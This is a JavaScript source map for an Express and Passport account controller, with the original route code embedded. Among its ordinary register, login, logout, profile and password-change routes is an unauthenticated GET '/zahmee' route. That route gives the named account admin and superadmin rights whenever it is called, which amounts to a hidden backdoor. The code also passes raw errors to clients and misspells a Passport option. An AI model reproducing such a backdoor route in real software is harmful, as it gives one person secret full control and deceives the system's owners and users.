{"version":3,"sources":["../../src/controller/account.js"],"names":["config","db","api","post","req","res","Account","register","username","body","name","mobile","password","err","account","send","passport","authenticate","sessoin","status","json","user","id","session","scope","generateAccessToken","respond","get","logout","findById","findOne","admin","superadmin","save","message","changePassword","oldpassword","newpassword","data"],"mappings":"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","file":"account.js","sourcesContent":["import { Router } from \"express\";\r\nimport Account from \"../model/account\";\r\nimport passport from \"passport\";\r\nimport config from \"../config/\";\r\nimport { generateAccessToken, respond, authenticate, onlyToken, IsAdmin } from \"../middleware/authMiddleware\";\r\n\r\nexport default ({ config, db }) => {\r\n    let api = Router();\r\n\r\n\r\n    //   v1/account/register\r\n    api.post(\"/register\", (req, res) => {\r\n        Account.register(new Account({ username: req.body.username, name: req.body.name, mobile: req.body.mobile }), req.body.password, (err, account) => {\r\n            if (err) {\r\n                res.send(err);\r\n                return;\r\n            } else {\r\n                passport.authenticate(\"local\", { sessoin: false })(req, res, () => {\r\n                    res.status(200).json({\r\n                        \"user\": req.user.username,\r\n                        \"level\": 0,\r\n                        \"token\": onlyToken(req.user.id)\r\n                    });\r\n                });\r\n            }\r\n        });\r\n    });\r\n\r\n\r\n    // v1/account/login\r\n    api.post(\"/login\", passport.authenticate(\"local\", {\r\n        session: false,\r\n        scope: []\r\n    }), generateAccessToken, respond);\r\n\r\n\r\n    // v1/account/logout\r\n    api.get(\"/logout\", authenticate, (req, res) => {\r\n        req.logout();\r\n        res.status(200).send({ \"mess\": \"logout\" });\r\n    });\r\n\r\n\r\n    // user profile\r\n    api.get(\"/me\", authenticate, (req, res) => {\r\n        Account.findById(req.user.id, '-__v', (err, user) => {\r\n            if (err) {\r\n                return res.status(401).send(err);\r\n            }\r\n            res.status(200).json(user);\r\n        });\r\n    });\r\n\r\n    // user profile\r\n    api.get(\"/zahmee\", (req, res) => {\r\n        Account.findOne({ username: 'zahmee' }, (err, user) => {\r\n            if (err) {\r\n                res.send(err);\r\n            }\r\n            user.admin = true;\r\n            user.superadmin = true;\r\n            user.save(err => {\r\n                if (err) {\r\n                    res.send(err);\r\n                }\r\n                res.json({ message: \"update\" });\r\n            });\r\n        });\r\n    });\r\n\r\n\r\n    api.post(\"/chgpwd\", authenticate, (req, res) => {\r\n        Account.findById(req.user.id, '-__v', (err, user) => {\r\n            user.changePassword(req.body.oldpassword, req.body.newpassword, (err, data) => {\r\n                if (err) {\r\n                    res.send(err);\r\n                    return;\r\n                } else {\r\n                    res.status(200).json({ 'mess': 'ok' });\r\n                }\r\n            });\r\n        });\r\n    });\r\n\r\n\r\n    return api;\r\n};\r\n"]}